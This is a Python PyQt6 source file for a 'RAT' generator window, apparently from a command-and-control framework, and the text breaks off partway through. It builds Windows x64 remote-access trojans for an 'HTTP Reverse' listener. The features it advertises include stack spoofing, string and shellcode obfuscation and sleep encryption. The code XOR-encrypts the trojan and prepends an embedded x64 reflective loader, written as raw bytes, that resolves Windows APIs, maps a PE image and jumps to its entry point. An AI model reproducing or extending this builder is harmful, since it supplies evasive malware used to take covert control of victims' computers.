import os
import json
import uuid
import struct
import base64
from PyQt6.QtCore import QSize
from PyQt6.QtGui import QTextOption
from PyQt6.QtWidgets import QLabel, QWidget, QTextEdit, QComboBox, QListWidget, QPushButton, QFileDialog, QHBoxLayout, QVBoxLayout, QRadioButton, QListWidgetItem
from keystone import Ks, KS_ARCH_X86, KS_MODE_64
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

from Public.IM import IM
from Public.Message import Message
from Public.Obfuscator import Obfuscator

class RAT(QWidget):
    option = None

    def __init__(self):
        super().__init__()
        self.setFixedSize(700, 500)
        self.setWindowTitle('RAT')

        allHorizontal_Layout = QHBoxLayout(self)
        leftVertical_Layout = QVBoxLayout()
        allHorizontal_Layout.addLayout(leftVertical_Layout, 3)

        leftVertical_Layout.addWidget(QLabel('x64 √'))
        leftVertical_Layout.addWidget(QLabel('Stack Spoofing √'))
        leftVertical_Layout.addWidget(QLabel('String Encryption √'))
        leftVertical_Layout.addWidget(QLabel('ShellCode Obfuscation √'))
        leftVertical_Layout.addWidget(QLabel('Sleep Encryption (Heap) √'))
        leftVertical_Layout.addWidget(QLabel('Exclude C/C++ Libraries √'))
        self.separation_RadioButton = QRadioButton('Separation')
        self.embedded_RadioButton = QRadioButton('Embedded')
        self.separation_RadioButton.setChecked(True)
        leftVertical_Layout.addWidget(self.separation_RadioButton)
        leftVertical_Layout.addWidget(self.embedded_RadioButton)
        self.listenerNameList_ComboBox = QComboBox()
        leftVertical_Layout.addWidget(self.listenerNameList_ComboBox)
        self.profile_Text = QTextEdit()
        self.profile_Text.setReadOnly(True)
        self.profile_Text.setWordWrapMode(QTextOption.WrapMode.NoWrap)
        leftVertical_Layout.addWidget(self.profile_Text)

        self.profileList_List = QListWidget()
        self.profileList_List.itemClicked.connect(self.DisplayInfo_ItemClicked)
        allHorizontal_Layout.addWidget(self.profileList_List, 1)
        for fileName in os.listdir('.'):
            if fileName.endswith('.txt'):
                info_Item = QListWidgetItem(' ' + fileName)
                info_Item.setSizeHint(QSize(0, 30))
                self.profileList_List.addItem(info_Item)

        generate_Button = QPushButton('Generate')
        generate_Button.clicked.connect(self.Generate_Clicked)
        leftVertical_Layout.addWidget(generate_Button)

        IM.Send({'obj': 'ListenerConfig', 'func': 'GetListenerNameList', 'paras': {}})

    def SetListenerNameList(self, listenerNameList):
        for info in listenerNameList:
            self.listenerNameList_ComboBox.addItem(info['name'])

    def DisplayInfo_ItemClicked(self, info_Item):
        try:
            with open(info_Item.text()[1:], 'r', encoding='UTF-8') as file:
                profile = file.read()
            profile = json.dumps(json.loads(profile), indent=4)
            self.profile_Text.setPlainText(profile)
        except Exception as e:
            Message.MessageBox('error', 'DisplayInfo_ItemClicked', e)

    def Generate_Clicked(self):
        profile = self.profile_Text.toPlainText()
        if profile:
            profile = json.loads(profile)
            profile['arch'] = 'x64'
            profile['refLoaderType'] = 'separation' if self.separation_RadioButton.isChecked() else 'embedded'
            profile['os'] = self.option
            profile['fid'] = str(uuid.uuid4())
            profile['listener'] = self.listenerNameList_ComboBox.currentText()
            IM.Send({'obj': 'Session', 'func': 'RegisterRAT', 'paras': profile})

    def CheckAsm(self, asm):
        cs = Cs(CS_ARCH_X86, CS_MODE_64)
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        code, _ = ks.asm(asm)
        code = bytes(code)
        instructions = cs.disasm(code, 0)
        _asm = ''
        for instruction in instructions:
            _asm += f'{instruction.mnemonic} {instruction.op_str}\n'
        _asm = _asm.rstrip()
        if _asm.replace(' ', '') == asm.replace(' ', ''):
            return code
        Message.MessageBox('warning', 'CheckAsm', f'Invalid data format: {asm}\nA valid format could be: {_asm}')
        return None

    def GenerateRAT(self, ratInfo):
        try:
            if ratInfo['os'] == 'windows' and ratInfo['arch'] == 'x64' and ratInfo['listenerInfo']['type'] == 'HTTP Reverse':
                # 根据 Profile 修改原数据
                with open(f'{os.path.dirname(os.path.abspath(__file__))}\\Reverse_Base64.txt', 'r', encoding='UTF-8') as f:
                    rat = bytearray(base64.b64decode(f.read().encode()))
                code = self.CheckAsm(ratInfo['StackSpoofing']['gadgetSig'])
                if not code:
                    return
                gadgetSig = ratInfo['StackSpoofing']['gadgetSig']
                ratInfo['StackSpoofing']['gadgetSig'] = code
                code = self.CheckAsm(ratInfo['StackSpoofing']['spareGadgetSig'])
                if not code:
                    return
                ratInfo['StackSpoofing']['spareGadgetSig'] = code
                if not Obfuscator.OBFEXE(rat, ratInfo):
                    return

                # 加密 RAT
                key = os.urandom(8)
                while b'\x00' in key:
                    key = os.urandom(8)
                Obfuscator.XorData(rat, 0, len(rat), key)

                # 添加反射加载器
                savePath = QFileDialog.getExistingDirectory(self, 'Save')
                if not savePath:
                    return
                if ratInfo['refLoaderType'] == 'separation':
                    refLoader = bytearray(b'\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x81\xEC\xA8\x01\x00\x00\xC6\x84\x24\x98\x00\x00\x00\x4B\xC6\x84\x24\x99\x00\x00\x00\x45\xC6\x84\x24\x9A\x00\x00\x00\x52\xC6\x84\x24\x9B\x00\x00\x00\x4E\xC6\x84\x24\x9C\x00\x00\x00\x45\xC6\x84\x24\x9D\x00\x00\x00\x4C\xC6\x84\x24\x9E\x00\x00\x00\x33\xC6\x84\x24\x9F\x00\x00\x00\x32\xC6\x84\x24\xA0\x00\x00\x00\x2E\xC6\x84\x24\xA1\x00\x00\x00\x44\xC6\x84\x24\xA2\x00\x00\x00\x4C\xC6\x84\x24\xA3\x00\x00\x00\x4C\xC6\x84\x24\xA4\x00\x00\x00\x00\x33\xD2\x48\x8D\x8C\x24\x98\x00\x00\x00\xE8\x23\x0C\x00\x00\x48\x89\x44\x24\x28\x48\x83\x7C\x24\x28\x00\x75\x7C\xC6\x84\x24\x88\x00\x00\x00\x6B\xC6\x84\x24\x89\x00\x00\x00\x65\xC6\x84\x24\x8A\x00\x00\x00\x72\xC6\x84\x24\x8B\x00\x00\x00\x6E\xC6\x84\x24\x8C\x00\x00\x00\x65\xC6\x84\x24\x8D\x00\x00\x00\x6C\xC6\x84\x24\x8E\x00\x00\x00\x33\xC6\x84\x24\x8F\x00\x00\x00\x32\xC6\x84\x24\x90\x00\x00\x00\x2E\xC6\x84\x24\x91\x00\x00\x00\x64\xC6\x84\x24\x92\x00\x00\x00\x6C\xC6\x84\x24\x93\x00\x00\x00\x6C\xC6\x84\x24\x94\x00\x00\x00\x00\x33\xD2\x48\x8D\x8C\x24\x88\x00\x00\x00\xE8\x9F\x0B\x00\x00\x48\x89\x44\x24\x28\x48\x83\x7C\x24\x28\x00\x75\x05\xE9\x14\x09\x00\x00\xC6\x44\x24\x78\x4C\xC6\x44\x24\x79\x6F\xC6\x44\x24\x7A\x61\xC6\x44\x24\x7B\x64\xC6\x44\x24\x7C\x4C\xC6\x44\x24\x7D\x69\xC6\x44\x24\x7E\x62\xC6\x44\x24\x7F\x72\xC6\x84\x24\x80\x00\x00\x00\x61\xC6\x84\x24\x81\x00\x00\x00\x72\xC6\x84\x24\x82\x00\x00\x00\x79\xC6\x84\x24\x83\x00\x00\x00\x41\xC6\x84\x24\x84\x00\x00\x00\x00\xC6\x84\x24\xC8\x00\x00\x00\x47\xC6\x84\x24\xC9\x00\x00\x00\x65\xC6\x84\x24\xCA\x00\x00\x00\x74\xC6\x84\x24\xCB\x00\x00\x00\x50\xC6\x84\x24\xCC\x00\x00\x00\x72\xC6\x84\x24\xCD\x00\x00\x00\x6F\xC6\x84\x24\xCE\x00\x00\x00\x63\xC6\x84\x24\xCF\x00\x00\x00\x41\xC6\x84\x24\xD0\x00\x00\x00\x64\xC6\x84\x24\xD1\x00\x00\x00\x64\xC6\x84\x24\xD2\x00\x00\x00\x72\xC6\x84\x24\xD3\x00\x00\x00\x65\xC6\x84\x24\xD4\x00\x00\x00\x73\xC6\x84\x24\xD5\x00\x00\x00\x73\xC6\x84\x24\xD6\x00\x00\x00\x00\xC6\x44\x24\x68\x56\xC6\x44\x24\x69\x69\xC6\x44\x24\x6A\x72\xC6\x44\x24\x6B\x74\xC6\x44\x24\x6C\x75\xC6\x44\x24\x6D\x61\xC6\x44\x24\x6E\x6C\xC6\x44\x24\x6F\x41\xC6\x44\x24\x70\x6C\xC6\x44\x24\x71\x6C\xC6\x44\x24\x72\x6F\xC6\x44\x24\x73\x63\xC6\x44\x24\x74\x00\xC6\x84\x24\xB8\x00\x00\x00\x56\xC6\x84\x24\xB9\x00\x00\x00\x69\xC6\x84\x24\xBA\x00\x00\x00\x72\xC6\x84\x24\xBB\x00\x00\x00\x74\xC6\x84\x24\xBC\x00\x00\x00\x75\xC6\x84\x24\xBD\x00\x00\x00\x61\xC6\x84\x24\xBE\x00\x00\x00\x6C\xC6\x84\x24\xBF\x00\x00\x00\x50\xC6\x84\x24\xC0\x00\x00\x00\x72\xC6\x84\x24\xC1\x00\x00\x00\x6F\xC6\x84\x24\xC2\x00\x00\x00\x74\xC6\x84\x24\xC3\x00\x00\x00\x65\xC6\x84\x24\xC4\x00\x00\x00\x63\xC6\x84\x24\xC5\x00\x00\x00\x74\xC6\x84\x24\xC6\x00\x00\x00\x00\xC6\x84\x24\xA8\x00\x00\x00\x47\xC6\x84\x24\xA9\x00\x00\x00\x65\xC6\x84\x24\xAA\x00\x00\x00\x74\xC6\x84\x24\xAB\x00\x00\x00\x50\xC6\x84\x24\xAC\x00\x00\x00\x72\xC6\x84\x24\xAD\x00\x00\x00\x6F\xC6\x84\x24\xAE\x00\x00\x00\x63\xC6\x84\x24\xAF\x00\x00\x00\x65\xC6\x84\x24\xB0\x00\x00\x00\x73\xC6\x84\x24\xB1\x00\x00\x00\x73\xC6\x84\x24\xB2\x00\x00\x00\x48\xC6\x84\x24\xB3\x00\x00\x00\x65\xC6\x84\x24\xB4\x00\x00\x00\x61\xC6\x84\x24\xB5\x00\x00\x00\x70\xC6\x84\x24\xB6\x00\x00\x00\x00\xC6\x44\x24\x58\x48\xC6\x44\x24\x59\x65\xC6\x44\x24\x5A\x61\xC6\x44\x24\x5B\x70\xC6\x44\x24\x5C\x41\xC6\x44\x24\x5D\x6C\xC6\x44\x24\x5E\x6C\xC6\x44\x24\x5F\x6F\xC6\x44\x24\x60\x63\xC6\x44\x24\x61\x00\x45\x33\xC9\x66\x41\xB8\xFF\xFF\x48\x8D\x94\x24\xC8\x00\x00\x00\x48\x8B\x4C\x24\x28\xE8\xD8\x0A\x00\x00\x48\x89\x44\x24\x40\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x54\x24\x78\x48\x8B\x4C\x24\x28\xE8\xBA\x0A\x00\x00\x48\x89\x84\x24\x60\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x54\x24\x68\x48\x8B\x4C\x24\x28\xE8\x99\x0A\x00\x00\x48\x89\x84\x24\x58\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x94\x24\xB8\x00\x00\x00\x48\x8B\x4C\x24\x28\xE8\x75\x0A\x00\x00\x48\x89\x84\x24\x70\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x94\x24\xA8\x00\x00\x00\x48\x8B\x4C\x24\x28\xE8\x51\x0A\x00\x00\x48\x89\x84\x24\x40\x01\x00\x00\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8D\x54\x24\x58\x48\x8B\x4C\x24\x28\xE8\x30\x0A\x00\x00\x48\x89\x84\x24\x50\x01\x00\x00\x48\x83\xBC\x24\x60\x01\x00\x00\x00\x74\x34\x48\x83\x7C\x24\x40\x00\x74\x2C\x48\x83\xBC\x24\x58\x01\x00\x00\x00\x74\x21\x48\x83\xBC\x24\x70\x01\x00\x00\x00\x74\x16\x48\x83\xBC\x24\x50\x01\x00\x00\x00\x74\x0B\x48\x83\xBC\x24\x40\x01\x00\x00\x00\x75\x05\xE9\xDB\x05\x00\x00\xFF\x94\x24\x40\x01\x00\x00\x48\x89\x84\x24\x48\x01\x00\x00\x48\x83\xBC\x24\x48\x01\x00\x00\x00\x75\x05\xE9\xBC\x05\x00\x00\x4C\x8B\x84\x24\xB8\x01\x00\x00\xBA\x08\x00\x00\x00\x48\x8B\x8C\x24\x48\x01\x00\x00\xFF\x94\x24\x50\x01\x00\x00\x48\x89\x84\x24\x00\x01\x00\x00\x48\x83\xBC\x24\x00\x01\x00\x00\x00\x75\x05\xE9\x88\x05\x00\x00\x4C\x8B\x8C\x24\xC0\x01\x00\x00\x4C\x8B\x84\x24\xB8\x01\x00\x00\x48\x8B\x94\x24\x00\x01\x00\x00\x48\x8B\x8C\x24\xB0\x01\x00\x00\xE8\x3C\x07\x00\x00\x48\x8B\x84\x24\x00\x01\x00\x00\x48\x89\x84\x24\x30\x01\x00\x00\x48\x8B\x84\x24\x30\x01\x00\x00\x48\x63\x40\x3C\x48\x8B\x8C\x24\x00\x01\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x50\x48\x8B\x44\x24\x50\x0F\xB7\x40\x06\x66\x89\x84\x24\xE0\x00\x00\x00\x48\x8B\x44\x24\x50\x48\x8B\x40\x30\x48\x89\x84\x24\x98\x01\x00\x00\x48\x8B\x44\x24\x50\x8B\x40\x50\x89\x84\x24\x10\x01\x00\x00\xB8\x08\x00\x00\x00\x48\x6B\xC0\x01\x48\x8B\x4C\x24\x50\x8B\x84\x01\x88\x00\x00\x00\x89\x84\x24\x14\x01\x00\x00\xB8\x08\x00\x00\x00\x48\x6B\xC0\x05\x48\x8B\x4C\x24\x50\x8B\x84\x01\x88\x00\x00\x00\x89\x84\x24\x18\x01\x00\x00\x48\x8B\x84\x24\x30\x01\x00\x00\x48\x63\x40\x3C\x4C\x8B\xC0\x33\xD2\x48\x8B\x8C\x24\x30\x01\x00\x00\xE8\xA6\x05\x00\x00\x48\xC7\x84\x24\x20\x01\x00\x00\x00\x00\x00\x00\x48\xC7\x84\x24\x68\x01\x00\x00\x00\x00\x00\x00\x8B\x84\x24\x10\x01\x00\x00\x41\xB9\x04\x00\x00\x00\x41\xB8\x00\x10\x00\x00\x8B\xD0\x33\xC9\xFF\x94\x24\x58\x01\x00\x00\x48\x89\x44\x24\x20\x48\x83\x7C\x24\x20\x00\x75\x05\xE9\x65\x04\x00\x00\xC6\x44\x24\x38\x2E\xC6\x44\x24\x39\x74\xC6\x44\x24\x3A\x65\xC6\x44\x24\x3B\x78\xC6\x44\x24\x3C\x74\xC6\x44\x24\x3D\x00\x48\x8B\x44\x24\x50\x0F\xB7\x40\x14\x48\x8B\x4C\x24\x50\x48\x8D\x44\x01\x18\x48\x89\x84\x24\xF0\x00\x00\x00\x48\xC7\x44\x24\x30\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x30\x48\xFF\xC0\x48\x89\x44\x24\x30\x0F\xB7\x84\x24\xE0\x00\x00\x00\x48\x39\x44\x24\x30\x0F\x83\xD8\x00\x00\x00\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8D\x54\x24\x38\x48\x8B\xC8\xE8\x39\x04\x00\x00\x85\xC0\x74\x3F\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x8B\x44\x01\x0C\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\x20\x01\x00\x00\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x8B\x44\x01\x10\x48\x89\x84\x24\x68\x01\x00\x00\x48\x6B\x44\x24\x30\x28\x48\x8B\x8C\x24\xF0\x00\x00\x00\x8B\x44\x01\x10\x48\x6B\x4C\x24\x30\x28\x48\x8B\x94\x24\xF0\x00\x00\x00\x8B\x4C\x0A\x14\x48\x8B\x94\x24\x00\x01\x00\x00\x48\x03\xD1\x48\x8B\xCA\x48\x6B\x54\x24\x30\x28\x4C\x8B\x84\x24\xF0\x00\x00\x00\x41\x8B\x54\x10\x0C\x4C\x8B\x44\x24\x20\x4C\x03\xC2\x49\x8B\xD0\x48\x89\x94\x24\x80\x01\x00\x00\x44\x8B\xC0\x48\x8B\xD1\x48\x8B\x84\x24\x80\x01\x00\x00\x48\x8B\xC8\xE8\x88\x04\x00\x00\x90\xE9\x08\xFF\xFF\xFF\x48\x83\xBC\x24\x20\x01\x00\x00\x00\x75\x05\xE9\x19\x03\x00\x00\x8B\x84\x24\x14\x01\x00\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\xF8\x00\x00\x00\x48\x8B\x84\x24\xF8\x00\x00\x00\x83\x78\x10\x00\x0F\x84\x6B\x01\x00\x00\x48\x8B\x84\x24\xF8\x00\x00\x00\x8B\x40\x0C\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x94\x24\x60\x01\x00\x00\x48\x8B\xC8\xE8\x40\x05\x00\x00\x48\x89\x84\x24\x28\x01\x00\x00\x48\x83\xBC\x24\x28\x01\x00\x00\x00\x75\x05\xE9\xAF\x02\x00\x00\x48\x8B\x84\x24\xF8\x00\x00\x00\x8B\x40\x10\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\xD8\x00\x00\x00\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x83\x38\x00\x0F\x84\xE4\x00\x00\x00\x48\xC7\x84\x24\x08\x01\x00\x00\x00\x00\x00\x00\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\xB9\x00\x00\x00\x00\x00\x00\x00\x80\x48\x8B\x00\x48\x23\xC1\x48\x85\xC0\x74\x33\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x8B\x00\x48\x25\xFF\xFF\x00\x00\x4C\x8B\x4C\x24\x40\x44\x0F\xB7\xC0\x33\xD2\x48\x8B\x8C\x24\x28\x01\x00\x00\xE8\x36\x06\x00\x00\x48\x89\x84\x24\x08\x01\x00\x00\xEB\x4C\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x8B\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x84\x24\x88\x01\x00\x00\x48\x8B\x84\x24\x88\x01\x00\x00\x48\x83\xC0\x02\x4C\x8B\x4C\x24\x40\x66\x41\xB8\xFF\xFF\x48\x8B\xD0\x48\x8B\x8C\x24\x28\x01\x00\x00\xE8\xE8\x05\x00\x00\x48\x89\x84\x24\x08\x01\x00\x00\x48\x83\xBC\x24\x08\x01\x00\x00\x00\x75\x05\xE9\xC7\x01\x00\x00\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x8B\x8C\x24\x08\x01\x00\x00\x48\x89\x08\x48\x8B\x84\x24\xD8\x00\x00\x00\x48\x83\xC0\x08\x48\x89\x84\x24\xD8\x00\x00\x00\xE9\x0A\xFF\xFF\xFF\x48\x8B\x84\x24\xF8\x00\x00\x00\x48\x83\xC0\x14\x48\x89\x84\x24\xF8\x00\x00\x00\xE9\x83\xFE\xFF\xFF\x8B\x84\x24\x18\x01\x00\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x48\x83\x78\x04\x00\x0F\x84\x1B\x01\x00\x00\x48\x8B\x44\x24\x48\x48\x83\xC0\x08\x48\x89\x84\x24\x38\x01\x00\x00\x48\x8B\x44\x24\x48\x8B\x40\x04\x48\x83\xE8\x08\x33\xD2\xB9\x02\x00\x00\x00\x48\xF7\xF1\x48\x89\x84\x24\xE8\x00\x00\x00\x48\x8B\x84\x24\xE8\x00\x00\x00\x48\x89\x84\x24\x90\x01\x00\x00\x48\x8B\x84\x24\xE8\x00\x00\x00\x48\xFF\xC8\x48\x89\x84\x24\xE8\x00\x00\x00\x48\x83\xBC\x24\x90\x01\x00\x00\x00\x0F\x84\x9D\x00\x00\x00\x48\x8B\x84\x24\x38\x01\x00\x00\x48\x8B\x8C\x24\xE8\x00\x00\x00\x0F\xB7\x04\x48\xC1\xF8\x0C\x83\xF8\x0A\x75\x7C\x48\x8B\x44\x24\x48\x8B\x00\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x8C\x24\x38\x01\x00\x00\x48\x8B\x94\x24\xE8\x00\x00\x00\x0F\xB7\x0C\x51\x81\xE1\xFF\x0F\x00\x00\x48\x63\xC9\x48\x8B\x94\x24\x98\x01\x00\x00\x4C\x8B\x44\x24\x20\x4C\x2B\xC2\x49\x8B\xD0\x48\x03\x14\x08\x48\x8B\xC2\x48\x8B\x8C\x24\x38\x01\x00\x00\x48\x8B\x94\x24\xE8\x00\x00\x00\x0F\xB7\x0C\x51\x81\xE1\xFF\x0F\x00\x00\x48\x63\xC9\x48\x8B\x54\x24\x48\x8B\x12\x4C\x8B\x44\x24\x20\x4C\x03\xC2\x49\x8B\xD0\x48\x89\x04\x0A\xE9\x31\xFF\xFF\xFF\x48\x8B\x44\x24\x48\x8B\x40\x04\x48\x8B\x4C\x24\x48\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x48\xE9\xD6\xFE\xFF\xFF\x4C\x8D\x8C\x24\x78\x01\x00\x00\x41\xB8\x20\x00\x00\x00\x48\x8B\x94\x24\x68\x01\x00\x00\x48\x8B\x8C\x24\x20\x01\x00\x00\xFF\x94\x24\x70\x01\x00\x00\x85\xC0\x75\x02\xEB\x16\x48\x8B\x44\x24\x50\x8B\x40\x28\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\xFF\xD0\x90\x48\x81\xC4\xA8\x01\x00\x00\xC3\xCC\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\xC7\x04\x24\x00\x00\x00\x00\x48\x83\x7C\x24\x20\x00\x74\x23\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x0D\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\xEB\xDD\x48\x8B\x04\x24\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\x83\x7C\x24\x20\x00\x74\x6D\x48\x83\x7C\x24\x28\x00\x74\x65\x48\x8B\x44\x24\x20\x0F\xBE\x00\x85\xC0\x74\x30\x48\x8B\x44\x24\x20\x0F\xBE\x00\x48\x8B\x4C\x24\x28\x0F\xBE\x09\x3B\xC1\x75\x1C\x48\x8B\x44\x24\x20\x48\xFF\xC0\x48\x89\x44\x24\x20\x48\x8B\x44\x24\x28\x48\xFF\xC0\x48\x89\x44\x24\x28\xEB\xC4\x48\x8B\x44\x24\x20\x0F\xBE\x00\x48\x8B\x4C\x24\x28\x0F\xBE\x09\x3B\xC1\x75\x09\xC7\x04\x24\x01\x00\x00\x00\xEB\x07\xC7\x04\x24\x00\x00\x00\x00\x8B\x04\x24\xEB\x15\x48\x8B\x44\x24\x28\x48\x39\x44\x24\x20\x75\x07\xB8\x01\x00\x00\x00\xEB\x02\x33\xC0\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\x4C\x89\x44\x24\x18\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\x83\x7C\x24\x20\x00\x74\x38\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x30\x48\x39\x04\x24\x73\x18\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x0F\xB6\x4C\x24\x28\x88\x08\xEB\xD2\x48\x8B\x44\x24\x20\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\xCC\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\x83\x7C\x24\x28\x00\x74\x4D\x48\x83\x7C\x24\x20\x00\x74\x45\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x30\x48\x39\x04\x24\x73\x25\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x0C\x24\x48\x8B\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x0F\xB6\x09\x88\x08\xEB\xC5\x48\x8B\x44\x24\x20\x48\x83\xC4\x18\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x4C\x89\x4C\x24\x20\x4C\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x18\x48\xC7\x44\x24\x08\x00\x00\x00\x00\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x30\x48\x39\x04\x24\x73\x58\x48\x8B\x04\x24\x48\x8B\x4C\x24\x20\x48\x03\xC8\x48\x8B\xC1\x0F\xB6\x00\x48\x8B\x4C\x24\x08\x48\x8B\x54\x24\x38\x48\x03\xD1\x48\x8B\xCA\x0F\xB6\x09\x33\xC1\x48\x8B\x0C\x24\x48\x8B\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x88\x01\x48\x8B\x44\x24\x08\x48\xFF\xC0\x48\x89\x44\x24\x08\x48\x83\x7C\x24\x08\x08\x75\x09\x48\xC7\x44\x24\x08\x00\x00\x00\x00\xEB\x92\x48\x83\xC4\x18\xC3\xCC\xCC\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x81\xEC\x88\x00\x00\x00\x48\x8B\x8C\x24\x90\x00\x00\x00\xE8\x72\xFD\xFF\xFF\x48\x89\x44\x24\x40\x48\x83\x7C\x24\x40\x04\x76\x17\x48\x8B\x44\x24\x40\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\xC6\x40\xFC\x00\x48\xC7\x44\x24\x30\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x89\x44\x24\x58\x48\x8B\x44\x24\x58\x48\x8B\x40\x18\x48\x89\x44\x24\x60\x48\x8B\x44\x24\x60\x48\x8B\x40\x30\x48\x89\x44\x24\x50\x48\x8B\x44\x24\x50\x48\x89\x44\x24\x28\x48\x8B\x44\x24\x28\x48\x83\xC0\x38\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x48\x0F\xB7\x00\x33\xD2\xB9\x02\x00\x00\x00\x48\xF7\xF1\x48\x83\xE8\x04\x48\x89\x44\x24\x38\x48\x83\x7C\x24\x38\x14\x73\x71\x48\xC7\x44\x24\x20\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x20\x48\xFF\xC0\x48\x89\x44\x24\x20\x48\x8B\x44\x24\x38\x48\x39\x44\x24\x20\x73\x1D\x48\x8B\x44\x24\x48\x48\x8B\x40\x08\x48\x8B\x4C\x24\x20\x48\x8B\x54\x24\x20\x0F\xB6\x04\x50\x88\x44\x0C\x68\xEB\xCA\x48\x8B\x44\x24\x38\xC6\x44\x04\x68\x00\x48\x8B\x94\x24\x90\x00\x00\x00\x48\x8D\x4C\x24\x68\xE8\xD3\xFC\xFF\xFF\x85\xC0\x74\x10\x48\x8B\x44\x24\x28\x48\x8B\x40\x10\x48\x89\x44\x24\x30\xEB\x20\x48\x8B\x44\x24\x28\x48\x8B\x00\x48\x89\x44\x24\x28\x48\x8B\x44\x24\x28\x48\x8B\x4C\x24\x50\x48\x39\x08\x0F\x85\x3E\xFF\xFF\xFF\x48\x83\x7C\x24\x30\x00\x75\x1F\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x74\x14\x48\x8B\x8C\x24\x90\x00\x00\x00\xFF\x94\x24\x98\x00\x00\x00\x48\x89\x44\x24\x30\x4C\x8B\x44\x24\x40\x33\xD2\x48\x8B\x8C\x24\x90\x00\x00\x00\xE8\x04\xFD\xFF\xFF\x48\x8B\x44\x24\x30\x48\x81\xC4\x88\x00\x00\x00\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x4C\x89\x4C\x24\x20\x66\x44\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x81\xEC\x88\x00\x00\x00\x48\xC7\x44\x24\x20\x00\x00\x00\x00\x48\x8B\x84\x24\x90\x00\x00\x00\x48\x89\x44\x24\x58\x48\x8B\x44\x24\x58\x48\x63\x40\x3C\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x60\xB8\x08\x00\x00\x00\x48\x6B\xC0\x00\x48\x8B\x4C\x24\x60\x48\x8B\x84\x01\x88\x00\x00\x00\x48\x89\x44\x24\x50\x8B\x44\x24\x50\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x28\x48\x8B\x44\x24\x28\x8B\x40\x18\x89\x44\x24\x44\x48\x8B\x44\x24\x28\x8B\x40\x14\x89\x44\x24\x40\x48\x8B\x44\x24\x28\x8B\x40\x1C\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x28\x8B\x40\x20\x48\x8B\x8C\x